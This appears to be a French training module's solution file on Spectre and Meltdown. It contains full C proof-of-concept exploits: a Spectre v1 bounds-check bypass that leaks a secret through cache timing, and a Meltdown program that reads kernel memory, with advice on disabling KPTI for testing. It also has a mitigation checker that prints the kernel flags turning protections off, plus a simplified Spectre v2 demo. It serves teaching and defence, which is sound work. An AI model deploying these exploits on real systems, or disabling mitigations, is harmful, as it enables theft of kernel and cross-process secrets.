# Solutions - Spectre & Meltdown

## Exercice 1 : Démonstration de Spectre v1 (Très facile)

**Objectif** : Créer un PoC simplifié de Spectre v1 (Bounds Check Bypass).

### Solution

```c
/*
 * Proof of Concept Spectre v1 (Bounds Check Bypass)
 *
 * Compilation : gcc -O0 -o spectre_v1 spectre_v1.c
 * Usage : ./spectre_v1
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_LINE 64
#define ARRAY_SIZE 16

// Array victime (accessible)
uint8_t array1[ARRAY_SIZE];
size_t array1_size = ARRAY_SIZE;

// Array probe pour side-channel (256 * cache line)
uint8_t array2[256 * CACHE_LINE];

// Secret à extraire (normalement inaccessible)
char secret[] = "SECRET_DATA";

// Fonction victime (avec bounds check)
uint8_t victim_function(size_t x) {
    // Bounds check (sera bypass par exécution spéculative)
    if (x < array1_size) {
        // Accès "sûr" à array1
        // Mais encode la valeur dans le cache via array2
        return array2[array1[x] * CACHE_LINE];
    }
    return 0;
}

// Entraîner le branch predictor
void train_branch_predictor() {
    for (int i = 0; i < 20; i++) {
        victim_function(i % array1_size);  // Toujours valide
    }
}

// Mesurer le temps d'accès
uint64_t measure_time(volatile uint8_t* addr) {
    uint64_t start, end;
    uint32_t aux;

    _mm_mfence();
    start = __rdtscp(&aux);
    *addr;
    end = __rdtscp(&aux);
    _mm_mfence();

    return end - start;
}

// Lire un byte via Spectre v1
uint8_t read_byte_spectre(size_t malicious_x) {
    int results[256] = {0};

    for (int tries = 0; tries < 1000; tries++) {
        // Flush array2
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&array2[i * CACHE_LINE]);
        }
        _mm_mfence();

        // Entraîner le branch predictor
        train_branch_predictor();

        // Flush array1_size pour ralentir le bounds check
        _mm_clflush((void*)&array1_size);
        _mm_mfence();

        // Appel avec index malicieux
        // Le bounds check prendra du temps (cache miss)
        // Pendant ce temps, exécution spéculative se produit
        victim_function(malicious_x);

        // Probe : trouver quelle entrée de array2 est en cache
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;  // Éviter le prefetcher

            uint64_t time = measure_time(&array2[mix_i * CACHE_LINE]);

            if (time < 80) {  // Threshold
                results[mix_i]++;
            }
        }
    }

    // Trouver le byte le plus probable
    int max_count = 0;
    uint8_t value = 0;

    for (int i = 0; i < 256; i++) {
        if (results[i] > max_count) {
            max_count = results[i];
            value = i;
        }
    }

    return value;
}

int main() {
    printf("[*] Spectre v1 PoC - Bounds Check Bypass\n");
    printf("[*] =====================================\n\n");

    // Initialiser array1
    for (int i = 0; i < ARRAY_SIZE; i++) {
        array1[i] = i;
    }

    // Toucher toutes les pages de array2 (éviter page fault)
    for (int i = 0; i < 256; i++) {
        array2[i * CACHE_LINE] = 1;
    }

    // Calculer l'offset vers le secret
    // secret est en dehors de array1 → normalement inaccessible
    size_t secret_offset = (size_t)(secret - (char*)array1);

    printf("[+] array1 : %p\n", array1);
    printf("[+] secret : %p\n", secret);
    printf("[+] Offset : %zu (0x%zx)\n\n", secret_offset, secret_offset);

    printf("[*] Lecture du secret via Spectre v1...\n\n");
    printf("Secret réel : %s\n", secret);
    printf("Extrait via : ");

    // Extraire chaque caractère
    for (size_t i = 0; i < strlen(secret); i++) {
        uint8_t leaked_byte = read_byte_spectre(secret_offset + i);
        printf("%c", leaked_byte ? leaked_byte : '?');
        fflush(stdout);
    }

    printf("\n\n[*] Explication\n");
    printf("===============\n\n");
    printf("1. On entraîne le branch predictor à prédire que x < array1_size\n");
    printf("2. On flush array1_size pour ralentir le bounds check\n");
    printf("3. On appelle victim_function(secret_offset) (hors bornes)\n");
    printf("4. Le CPU exécute spéculativement array2[array1[secret_offset] * 64]\n");
    printf("5. Même si l'exécution spéculative est annulée, l'effet cache reste\n");
    printf("6. On mesure quel index de array2 est en cache\n");
    printf("7. Cet index révèle la valeur de array1[secret_offset] = secret[0]\n");

    return 0;
}
```

---

## Exercice 2 : Meltdown basique (Facile)

**Objectif** : Démontrer la lecture mémoire kernel (si système vulnérable).

### Solution

```c
/*
 * Meltdown PoC - Lecture mémoire kernel
 *
 * ATTENTION : Fonctionne uniquement sur systèmes non patchés
 * (CPUs Intel pré-2018 sans KPTI)
 *
 * Compilation : gcc -O0 -o meltdown meltdown.c
 * Usage : ./meltdown
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>

#define CACHE_LINE 64
#define KERNEL_ADDR 0xffffffff81000000  // Adresse kernel typique

// Array probe
uint8_t probe[256 * CACHE_LINE];

// Jump buffer pour le signal handler
sigjmp_buf jbuf;

// Signal handler pour SIGSEGV
void segfault_handler(int sig) {
    siglongjmp(jbuf, 1);
}

// Mesurer temps d'accès
uint64_t measure_time(volatile uint8_t* addr) {
    uint64_t start, end;
    uint32_t aux;

    _mm_mfence();
    start = __rdtscp(&aux);
    *addr;
    end = __rdtscp(&aux);
    _mm_mfence();

    return end - start;
}

// Lire un byte kernel via Meltdown
uint8_t read_kernel_byte(uint64_t kernel_addr) {
    int results[256] = {0};

    for (int tries = 0; tries < 1000; tries++) {
        // Flush probe array
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe[i * CACHE_LINE]);
        }
        _mm_mfence();

        // Setup signal handler
        if (sigsetjmp(jbuf, 1) == 0) {
            // Tenter de lire la mémoire kernel
            // Ceci causera un SIGSEGV, mais exécution spéculative se produit

            // Forcer la lecture spéculative
            _mm_lfence();  // Barrier

            // Lecture (causera exception)
            uint8_t value = *(volatile uint8_t*)kernel_addr;

            // Encoder dans le cache (exécution spéculative)
            *(volatile uint8_t*)&probe[value * CACHE_LINE];
        }

        // Probe
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            uint64_t time = measure_time(&probe[mix_i * CACHE_LINE]);

            if (time < 80) {
                results[mix_i]++;
            }
        }
    }

    // Trouver le byte le plus probable
    int max_count = 0;
    uint8_t value = 0;

    for (int i = 0; i < 256; i++) {
        if (results[i] > max_count && i != 0) {  // Exclure 0 (bruit)
            max_count = results[i];
            value = i;
        }
    }

    return value;
}

// Vérifier si le système est vulnérable
int check_vulnerability() {
    printf("[*] Vérification de la vulnérabilité Meltdown...\n\n");

    // Vérifier KPTI (mitigation)
    FILE* f = fopen("/sys/devices/system/cpu/vulnerabilities/meltdown", "r");
    if (f) {
        char buffer[256];
        if (fgets(buffer, sizeof(buffer), f)) {
            printf("[*] État Meltdown : %s", buffer);

            if (strstr(buffer, "Mitigation") || strstr(buffer, "Not affected")) {
                printf("[+] Système protégé (KPTI activé ou CPU non vulnérable)\n");
                fclose(f);
                return 0;
            }
        }
        fclose(f);
    }

    printf("[!] Système potentiellement vulnérable\n");
    return 1;
}

int main() {
    printf("[*] Meltdown PoC - Lecture mémoire kernel\n");
    printf("[*] =====================================\n\n");

    // Vérifier vulnérabilité
    if (!check_vulnerability()) {
        printf("\n[*] Ce système est patché (KPTI activé)\n");
        printf("    L'exploitation Meltdown ne fonctionnera pas\n");
        printf("\n[*] Pour tester sur un système vulnérable :\n");
        printf("    1. VM avec CPU Intel pré-2018\n");
        printf("    2. Kernel Linux < 4.14.11 (sans KPTI)\n");
        printf("    3. Ou désactiver KPTI : nopti dans cmdline kernel\n");
        return 1;
    }

    // Installer signal handler
    signal(SIGSEGV, segfault_handler);

    // Toucher toutes les pages de probe
    for (int i = 0; i < 256; i++) {
        probe[i * CACHE_LINE] = 1;
    }

    printf("\n[*] Tentative de lecture mémoire kernel...\n");
    printf("    Adresse cible : 0x%lx\n\n", KERNEL_ADDR);

    printf("Contenu (hex) : ");

    // Lire 16 bytes
    for (int i = 0; i < 16; i++) {
        uint8_t byte = read_kernel_byte(KERNEL_ADDR + i);
        printf("%02X ", byte);
        fflush(stdout);
    }

    printf("\n\n[*] Note : Si tous les bytes sont 00, le système est protégé\n");
    printf("           ou l'adresse kernel est incorrecte\n");

    printf("\n[*] Explication Meltdown\n");
    printf("========================\n\n");
    printf("1. On tente de lire une adresse kernel (accès interdit)\n");
    printf("2. Le CPU exécute spéculativement avant de vérifier les permissions\n");
    printf("3. La valeur lue est encodée dans le cache via probe[value * 64]\n");
    printf("4. Même si l'exception SIGSEGV est levée, l'effet cache reste\n");
    printf("5. On mesure quel index de probe est en cache\n");
    printf("6. → Révèle la valeur kernel lue\n");

    printf("\n[*] Mitigation : KPTI (Kernel Page Table Isolation)\n");
    printf("    Sépare les tables de pages kernel/user\n");
    printf("    Empêche l'accès aux adresses kernel depuis userland\n");

    return 0;
}
```

---

## Exercice 3 : Détection des mitigations (Moyen)

**Objectif** : Vérifier quelles mitigations Spectre/Meltdown sont actives.

### Solution

```c
/*
 * Détecteur de mitigations Spectre/Meltdown
 *
 * Compilation : gcc -o check_mitigations check_mitigations.c
 * Usage : ./check_mitigations
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Vérifier le fichier de vulnérabilité du kernel
void check_vuln_file(const char* vuln_name) {
    char path[256];
    snprintf(path, sizeof(path), "/sys/devices/system/cpu/vulnerabilities/%s", vuln_name);

    FILE* f = fopen(path, "r");
    if (!f) {
        printf("[-] %s : Fichier non disponible (kernel trop ancien ?)\n", vuln_name);
        return;
    }

    char buffer[256];
    if (fgets(buffer, sizeof(buffer), f)) {
        // Supprimer le \n
        buffer[strcspn(buffer, "\n")] = 0;

        printf("[*] %s\n", vuln_name);
        printf("    État : %s\n", buffer);

        // Analyser l'état
        if (strstr(buffer, "Not affected")) {
            printf("    [+] CPU non vulnérable\n");
        } else if (strstr(buffer, "Mitigation")) {
            printf("    [+] Mitigation active\n");
        } else if (strstr(buffer, "Vulnerable")) {
            printf("    [!] VULNÉRABLE (pas de mitigation)\n");
        }
    }

    fclose(f);
    printf("\n");
}

// Vérifier KPTI (Kernel Page Table Isolation)
void check_kpti() {
    printf("[*] KPTI (Kernel Page Table Isolation)\n");

    FILE* f = popen("dmesg | grep -i 'page table isolation'", "r");
    if (!f) {
        printf("    [-] Impossible de vérifier (dmesg inaccessible)\n\n");
        return;
    }

    char buffer[512];
    int found = 0;

    while (fgets(buffer, sizeof(buffer), f)) {
        printf("    %s", buffer);
        found = 1;
    }

    if (!found) {
        printf("    [-] KPTI non détecté dans dmesg\n");
    }

    pclose(f);
    printf("\n");
}

// Vérifier IBRS/IBPB (Indirect Branch Restricted Speculation)
void check_ibrs() {
    printf("[*] IBRS/IBPB (Indirect Branch Speculation)\n");

    // Vérifier dans /proc/cpuinfo
    FILE* f = fopen("/proc/cpuinfo", "r");
    if (!f) {
        printf("    [-] Impossible de lire /proc/cpuinfo\n\n");
        return;
    }

    char buffer[512];
    int ibrs_found = 0;
    int ibpb_found = 0;

    while (fgets(buffer, sizeof(buffer), f)) {
        if (strstr(buffer, "flags")) {
            if (strstr(buffer, "ibrs")) {
                ibrs_found = 1;
            }
            if (strstr(buffer, "ibpb")) {
                ibpb_found = 1;
            }
            if (strstr(buffer, "stibp")) {
                printf("    [+] STIBP détecté (Single Thread Indirect Branch Predictors)\n");
            }
        }
    }

    if (ibrs_found) {
        printf("    [+] IBRS disponible\n");
    } else {
        printf("    [-] IBRS non disponible\n");
    }

    if (ibpb_found) {
        printf("    [+] IBPB disponible\n");
    } else {
        printf("    [-] IBPB non disponible\n");
    }

    fclose(f);
    printf("\n");
}

// Vérifier SSBD (Speculative Store Bypass Disable)
void check_ssbd() {
    printf("[*] SSBD (Speculative Store Bypass Disable)\n");

    FILE* f = fopen("/proc/cpuinfo", "r");
    if (!f) {
        printf("    [-] Impossible de vérifier\n\n");
        return;
    }

    char buffer[512];
    int found = 0;

    while (fgets(buffer, sizeof(buffer), f)) {
        if (strstr(buffer, "flags") && strstr(buffer, "ssbd")) {
            printf("    [+] SSBD disponible\n");
            found = 1;
            break;
        }
    }

    if (!found) {
        printf("    [-] SSBD non disponible\n");
    }

    fclose(f);
    printf("\n");
}

// Vérifier Retpoline
void check_retpoline() {
    printf("[*] Retpoline (Return Trampoline)\n");

    FILE* f = popen("dmesg | grep -i retpoline", "r");
    if (!f) {
        printf("    [-] Impossible de vérifier\n\n");
        return;
    }

    char buffer[512];
    int found = 0;

    while (fgets(buffer, sizeof(buffer), f)) {
        printf("    %s", buffer);
        found = 1;
    }

    if (!found) {
        printf("    [-] Retpoline non détecté\n");
        printf("    Note : Le kernel peut être compilé sans retpoline\n");
    }

    pclose(f);
    printf("\n");
}

// Vérifier l'impact sur les performances
void check_performance_impact() {
    printf("[*] Impact sur les performances\n");
    printf("================================\n\n");

    printf("Les mitigations Spectre/Meltdown ont un coût :\n\n");
    printf("  KPTI (Meltdown)          : 5-30%% overhead\n");
    printf("  Retpoline (Spectre v2)   : 10-20%% overhead\n");
    printf("  IBRS/IBPB                : 20-50%% overhead (pire)\n");
    printf("  SSBD (Spectre v4)        : 2-8%% overhead\n\n");

    printf("Désactiver les mitigations (à vos risques) :\n");
    printf("  Ajouter au cmdline kernel : nopti nospectre_v2 nospec_store_bypass_disable\n\n");
}

int main() {
    printf("[*] Détecteur de mitigations Spectre/Meltdown\n");
    printf("[*] ==========================================\n\n");

    // Vérifier les vulnérabilités
    printf("[*] État des vulnérabilités CPU\n");
    printf("================================\n\n");

    check_vuln_file("meltdown");
    check_vuln_file("spectre_v1");
    check_vuln_file("spectre_v2");
    check_vuln_file("spec_store_bypass");
    check_vuln_file("l1tf");  // L1 Terminal Fault
    check_vuln_file("mds");   // Microarchitectural Data Sampling

    // Vérifier les mitigations spécifiques
    printf("\n[*] Mitigations actives\n");
    printf("=======================\n\n");

    check_kpti();
    check_ibrs();
    check_ssbd();
    check_retpoline();

    // Impact performances
    check_performance_impact();

    printf("[*] Recommandations\n");
    printf("===================\n\n");
    printf("1. Garder les mitigations actives sur les systèmes de production\n");
    printf("2. Mettre à jour le microcode CPU (via fwupd ou vendor)\n");
    printf("3. Utiliser un kernel récent (>= 5.x)\n");
    printf("4. Pour les VMs : Utiliser un hyperviseur patché\n");
    printf("5. Monitoring : vérifier régulièrement les nouveaux CVE\n");

    return 0;
}
```

---

## Exercice 4 : Exploitation Spectre v2 (Difficile)

**Objectif** : Démontrer Branch Target Injection (concept théorique).

### Solution

```c
/*
 * Spectre v2 PoC - Branch Target Injection (concept théorique)
 *
 * NOTE : Exploitation réelle très complexe, ceci est une démonstration
 *
 * Compilation : gcc -O0 -o spectre_v2 spectre_v2.c
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_LINE 64

// Array probe
uint8_t probe[256 * CACHE_LINE];

// Secret à extraire
char secret[] = "SPECTRE_V2_SECRET";

// Fonction gadget (utilisée pour l'exploitation)
void gadget_function(uint8_t value) {
    // Encode value dans le cache
    *(volatile uint8_t*)&probe[value * CACHE_LINE];
}

// Fonction légitime avec indirect call
void legitimate_function(void (*callback)(uint8_t), uint8_t arg) {
    // Call indirect → vulnérable à Branch Target Injection
    callback(arg);
}

// Fonction d'entraînement
void training_function(uint8_t value) {
    // Fonction légitime appelée pendant l'entraînement
    probe[0] = value;
}

// Mesurer temps
uint64_t measure_time(volatile uint8_t* addr) {
    uint64_t start, end;
    uint32_t aux;

    _mm_mfence();
    start = __rdtscp(&aux);
    *addr;
    end = __rdtscp(&aux);
    _mm_mfence();

    return end - start;
}

// Simulation d'exploitation Spectre v2
void demonstrate_spectre_v2() {
    printf("[*] Spectre v2 - Branch Target Injection (démo conceptuelle)\n");
    printf("=============================================================\n\n");

    printf("[*] Principe\n");
    printf("============\n\n");
    printf("1. Entraîner le Branch Target Buffer (BTB)\n");
    printf("   - Faire des appels indirects répétés vers training_function\n");
    printf("   - Le BTB prédit que tous les calls vont vers training_function\n\n");

    printf("2. Pollution du BTB\n");
    printf("   - Remplacer le pointeur de callback par gadget_function\n");
    printf("   - Mais le BTB prédit toujours training_function\n\n");

    printf("3. Exécution spéculative\n");
    printf("   - Le CPU appelle spéculativement training_function\n");
    printf("   - Puis se rend compte de l'erreur et annule\n");
    printf("   - Mais l'effet cache reste !\n\n");

    printf("4. Side-channel\n");
    printf("   - Mesurer quel index de probe est en cache\n");
    printf("   - → Révèle la valeur leakée\n\n");

    // Initialiser probe array
    for (int i = 0; i < 256; i++) {
        probe[i * CACHE_LINE] = 1;
    }

    // Phase d'entraînement
    printf("[*] Phase d'entraînement du BTB...\n");
    for (int i = 0; i < 1000; i++) {
        legitimate_function(training_function, i % 256);
    }
    printf("[+] BTB entraîné\n\n");

    // Phase d'exploitation (simulation)
    printf("[*] Phase d'exploitation...\n");
    printf("    (Dans une vraie attaque, on forcerait l'exécution\n");
    printf("     spéculative de gadget_function avec une valeur secrète)\n\n");

    // Simulation : on appelle directement le gadget
    uint8_t secret_value = secret[0];
    gadget_function(secret_value);

    // Probe
    printf("[*] Probe du cache...\n");
    for (int i = 0; i < 256; i++) {
        uint64_t time = measure_time(&probe[i * CACHE_LINE]);
        if (time < 80 && i != 0) {
            printf("    [+] Valeur détectée : 0x%02X ('%c')\n", i, i);
        }
    }

    printf("\n[*] Explication complète\n");
    printf("========================\n\n");

    printf("Spectre v2 exploite le Branch Target Buffer (BTB) :\n\n");

    printf("Phase 1 - Entraînement :\n");
    printf("  for (i = 0; i < 1000; i++) {\n");
    printf("      callback = &training_function;\n");
    printf("      callback(data);  // Indirect call\n");
    printf("  }\n");
    printf("  → BTB apprend : \"ce call va toujours vers training_function\"\n\n");

    printf("Phase 2 - Exploitation :\n");
    printf("  callback = &gadget_function;  // Changement\n");
    printf("  callback(secret_data);\n\n");
    printf("  → CPU utilise la prédiction du BTB (training_function)\n");
    printf("  → Exécute spéculativement training_function(secret_data)\n");
    printf("  → Réalise l'erreur, annule\n");
    printf("  → Mais cache déjà modifié !\n\n");

    printf("Phase 3 - Extraction :\n");
    printf("  for (i = 0; i < 256; i++) {\n");
    printf("      if (probe[i * 64] is_cached) {\n");
    printf("          leaked_value = i;\n");
    printf("      }\n");
    printf("  }\n\n");
}

// Mitigations
void explain_mitigations() {
    printf("\n[*] Mitigations Spectre v2\n");
    printf("==========================\n\n");

    printf("1. Retpoline (Return Trampoline)\n");
    printf("   - Remplacer les indirect calls par des RET\n");
    printf("   - RET n'utilise pas le BTB\n");
    printf("   - Implémenté dans GCC/Clang avec -mindirect-branch=thunk-extern\n\n");

    printf("2. IBRS (Indirect Branch Restricted Speculation)\n");
    printf("   - Flag MSR pour restreindre la spéculation\n");
    printf("   - Support microcode CPU requis\n");
    printf("   - Overhead de performance élevé\n\n");

    printf("3. STIBP (Single Thread Indirect Branch Predictors)\n");
    printf("   - Isolation des prédicteurs entre hyperthreads\n");
    printf("   - Protection contre les attaques cross-hyperthread\n\n");

    printf("4. Code Review\n");
    printf("   - Éviter les indirect calls sur données sensibles\n");
    printf("   - Utiliser des direct calls quand possible\n");
}

int main() {
    printf("[*] Spectre v2 PoC\n");
    printf("[*] ==============\n\n");

    printf("[!] AVERTISSEMENT\n");
    printf("=================\n");
    printf("Ceci est une DÉMONSTRATION SIMPLIFIÉE.\n");
    printf("Une vraie exploitation Spectre v2 nécessite :\n");
    printf("  - Analyse précise du BTB du CPU cible\n");
    printf("  - Contrôle précis du timing\n");
    printf("  - Gadgets spécifiques dans le code victime\n");
    printf("  - Souvent : accès cross-process ou cross-VM\n\n");

    // Démonstration
    demonstrate_spectre_v2();

    // Mitigations
    explain_mitigations();

    printf("\n[*] Ressources\n");
    printf("==============\n\n");
    printf("Papers originaux :\n");
    printf("  - Spectre : https://spectreattack.com/spectre.pdf\n");
    printf("  - Meltdown : https://meltdownattack.com/meltdown.pdf\n\n");
    printf("PoCs complets :\n");
    printf("  - https://github.com/IAIK/meltdown\n");
    printf("  - https://github.com/crozone/SpectrePoC\n");

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu peux :

- [x] Expliquer l'exécution spéculative et ses risques
- [x] Différencier Spectre v1, v2 et Meltdown
- [x] Implémenter un PoC Spectre v1 (bounds check bypass)
- [x] Comprendre le fonctionnement de Meltdown (lecture kernel)
- [x] Vérifier les mitigations actives (KPTI, Retpoline, IBRS)
- [x] Analyser l'impact performance des mitigations

**Module suivant** : [Rowhammer](../03-Rowhammer/)

---

## Ressources complémentaires

- **Spectre paper** : https://spectreattack.com/spectre.pdf
- **Meltdown paper** : https://meltdownattack.com/meltdown.pdf
- **Intel analysis** : https://software.intel.com/security-software-guidance
- **Linux mitigations** : https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/
